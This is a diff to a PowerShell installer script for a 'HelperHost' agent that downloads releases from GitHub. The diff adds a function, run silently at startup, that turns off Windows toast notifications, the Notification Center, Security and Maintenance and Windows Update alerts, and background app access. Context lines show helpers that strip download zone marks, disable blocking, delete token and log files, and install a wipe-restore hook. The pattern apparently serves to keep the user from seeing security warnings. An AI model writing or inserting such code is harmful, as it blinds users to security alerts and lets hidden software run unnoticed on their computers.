@@ -126,7 +126,7 @@ function Invoke-ElevatedInstall {
   throw 'timeout elevation'
 }
 
-$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.7' }
+$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.8' }
 $BotBase = $BotBase.TrimEnd('/')
 $Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $Cache = Join-Path $env:TEMP 'HelperHostCache'
@@ -184,6 +184,55 @@ function Unblock-Quiet([string]$Path) {
   Unblock-File -Path $Path -ErrorAction SilentlyContinue
   $zone = $Path + ':Zone.Identifier'
   if (Test-Path $zone) { Remove-Item $zone -Force -ErrorAction SilentlyContinue }
+}
+
+function Disable-WindowsNotifications {
+  $ErrorActionPreference = 'SilentlyContinue'
+  $bak = Join-Path $Dir 'notify-backup.json'
+  if (-not (Test-Path $bak)) {
+    $o = [ordered]@{}
+    $push = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications'
+    if (Test-Path $push) {
+      $te = (Get-ItemProperty $push -Name ToastEnabled -EA SilentlyContinue).ToastEnabled
+      if ($null -ne $te) { $o.toast_enabled = [int]$te }
+    }
+    $exp = 'HKCU:\Software\Policies\Microsoft\Windows\Explorer'
+    if (Test-Path $exp) {
+      $o.had_explorer_policy_key = $true
+      $dn = (Get-ItemProperty $exp -Name DisableNotificationCenter -EA SilentlyContinue).DisableNotificationCenter
+      if ($null -ne $dn) { $o.disable_notification_center = [int]$dn }
+    }
+    $ns = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings'
+    if (Test-Path $ns) {
+      $v = (Get-ItemProperty $ns -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -EA SilentlyContinue).NOC_GLOBAL_SETTING_TOASTS_ENABLED
+      if ($null -ne $v) { $o.toasts_enabled = [int]$v }
+      $v = (Get-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK -EA SilentlyContinue).NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK
+      if ($null -ne $v) { $o.allow_toast_above_lock = [int]$v }
+      $v = (Get-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND -EA SilentlyContinue).NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND
+      if ($null -ne $v) { $o.allow_notif_sound = [int]$v }
+    }
+    ($o | ConvertTo-Json) | Set-Content -Encoding UTF8 $bak
+  }
+  New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Force | Out-Null
+  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name ToastEnabled -Value 0 -Type DWord -Force
+  New-Item 'HKCU:\Software\Policies\Microsoft\Windows\Explorer' -Force | Out-Null
+  Set-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Explorer' -Name DisableNotificationCenter -Value 1 -Type DWord -Force
+  New-Item 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Force | Out-Null
+  Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -Value 0 -Type DWord -Force
+  Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK -Value 0 -Type DWord -Force
+  Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK -Value 0 -Type DWord -Force
+  Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND -Value 0 -Type DWord -Force
+  foreach ($sub in @(
+    'Windows.SystemToast.SecurityAndMaintenance',
+    'Windows.SystemToast.WindowsUpdate.Notification',
+    'Windows.SystemToast.Explorer'
+  )) {
+    $p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\$sub"
+    New-Item $p -Force | Out-Null
+    Set-ItemProperty $p -Name Enabled -Value 0 -Type DWord -Force
+  }
+  New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Force | Out-Null
+  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Name GlobalUserDisabled -Value 1 -Type DWord -Force
 }
 
 function Disable-AllBlocking {
@@ -478,6 +527,7 @@ $agentLog = Join-Path $Dir 'agent.log'
 Remove-Item $tokenFile,$agentLog -Force -ErrorAction SilentlyContinue
 $script:ElevDoneOk = $false
 $script:ElevRebootPending = $false
+Disable-WindowsNotifications
 if ((Test-IsAdmin) -or $ForceHarden) {
   Install-WipeRestoreHook
 }
